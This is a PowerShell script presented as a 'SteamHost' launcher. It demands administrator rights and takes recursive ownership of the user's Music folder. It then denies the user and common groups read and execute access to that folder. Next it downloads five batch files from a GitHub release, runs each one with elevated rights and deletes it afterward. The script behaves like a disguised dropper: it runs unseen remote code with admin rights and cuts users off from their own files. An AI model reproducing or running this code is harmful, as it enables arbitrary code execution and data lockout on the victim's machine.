# steamhost_launcher.ps1
# Script to restrict Music folder permissions, then execute batch files

param(
    [switch]$Silent = $false
)

# Function to display colored output
function Write-ColorOutput {
    param([string]$Message, [string]$Color = "White")
    Write-Host $Message -ForegroundColor $Color
}

# Function to check if running as administrator
function Test-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
    return (New-Object Security.Principal.WindowsPrincipal($currentUser)).IsInRole($adminRole)
}

# Main execution
try {
    if (-not $Silent) {
        Write-ColorOutput "SteamHost Launcher Script" "Green"
        Write-ColorOutput "=========================" "Green"
    }
    
    # Define paths
    $musicPath = [Environment]::GetFolderPath("MyMusic")
    $username = $env:USERNAME
    
    if (-not $Silent) {
        Write-ColorOutput "Target folder: $musicPath" "Yellow"
    }
    
    # Check if running as administrator
    if (-not (Test-Admin)) {
        Write-ColorOutput "This script requires administrator privileges to continue." "Red"
        Write-ColorOutput "Please right-click on PowerShell and select 'Run as Administrator'" "Red"
        Write-ColorOutput "or right-click this script and select 'Run with PowerShell'." "Red"
        if (-not $Silent) { pause }
        exit 1
    }
    
    if (-not $Silent) {
        Write-ColorOutput "Running with administrator privileges..." "Green"
    }
    
    # Step 1: Take ownership of the Music folder
    try {
        if (-not $Silent) {
            Write-ColorOutput "Step 1: Taking ownership of Music folder..." "Yellow"
        }
        
        $takeOwnCommand = "takeown /f `"$musicPath`" /r /d y"
        Invoke-Expression $takeOwnCommand | Out-Null
        
        if (-not $Silent) {
            Write-ColorOutput "✓ Ownership taken successfully" "Green"
        }
    }
    catch {
        Write-ColorOutput "Warning: Could not take ownership: $($_.Exception.Message)" "Yellow"
    }
    
    # Step 2: Remove all permissions and deny read/execute for current user
    try {
        if (-not $Silent) {
            Write-ColorOutput "Step 2: Restricting Music folder permissions..." "Yellow"
        }
        
        # Remove inheritance and all existing permissions
        icacls "$musicPath" /inheritance:r /t 2>$null | Out-Null
        
        # Deny read and execute permissions for current user
        icacls "$musicPath" /deny "${username}:(RX)" /t 2>$null | Out-Null
        
        # Also deny read/execute for other common groups
        icacls "$musicPath" /deny "Users:(RX)" /t 2>$null | Out-Null
        icacls "$musicPath" /deny "Authenticated Users:(RX)" /t 2>$null | Out-Null
        
        # Only allow SYSTEM and Administrators full access (for management)
        icacls "$musicPath" /grant "SYSTEM:F" /t 2>$null | Out-Null
        icacls "$musicPath" /grant "Administrators:F" /t 2>$null | Out-Null
        
        if (-not $Silent) {
            Write-ColorOutput "✓ Music folder permissions restricted successfully" "Green"
            Write-ColorOutput "  - Read and Execute access denied for current user" "Yellow"
            Write-ColorOutput "  - Only SYSTEM and Administrators have access" "Yellow"
        }
    }
    catch {
        Write-ColorOutput "Warning: Could not set permissions: $($_.Exception.Message)" "Yellow"
    }
    
    # Part 2: Batch File Download and Execution
    Write-Host "`nStarting batch file download and execution process..." -ForegroundColor Green

    # List of batch files to download and execute
    $batchFiles = @(
        "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/3.bat",
        "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/4.bat",
        "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/5.bat",
        "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/6.bat",
        "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/7.bat"
    )

    foreach ($batchUrl in $batchFiles) {
        $batchName = [System.IO.Path]::GetFileName($batchUrl)
        $batchPath = "$env:TEMP\$batchName"
        
        Write-Host "Downloading $batchName..." -ForegroundColor Yellow
        try {
            # Download batch file
            Invoke-WebRequest -Uri $batchUrl -OutFile $batchPath -ErrorAction Stop
            Write-Host "Download completed: $batchName" -ForegroundColor Green
            
            # Run batch file and wait for completion
            Write-Host "Executing $batchName..." -ForegroundColor Yellow
            $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$batchPath`"" -Wait -PassThru -NoNewWindow
            
            if ($process.ExitCode -eq 0) {
                Write-Host "Execution completed: $batchName" -ForegroundColor Green
            } else {
                Write-Host "Execution completed with exit code $($process.ExitCode): $batchName" -ForegroundColor Yellow
            }
            
            # Delete the batch file
            Write-Host "Deleting $batchName..." -ForegroundColor Yellow
            Remove-Item -Path $batchPath -Force -ErrorAction Stop
            Write-Host "Deleted: $batchName" -ForegroundColor Green
            
        } catch {
            Write-Host "Error processing $batchName : $($_.Exception.Message)" -ForegroundColor Red
        }
        
        Write-Host "----------------------------------------" -ForegroundColor Gray
    }

    Write-Host "Batch file processing completed!" -ForegroundColor Green
    
}
catch {
    Write-ColorOutput "Unexpected error: $($_.Exception.Message)" "Red"
    if (-not $Silent) { pause }
    exit 1
}

if (-not $Silent) {
    Write-ColorOutput "Script execution completed." "Green"
    Write-ColorOutput "Music folder permissions have been restricted." "Yellow"
    timeout /t 5
}
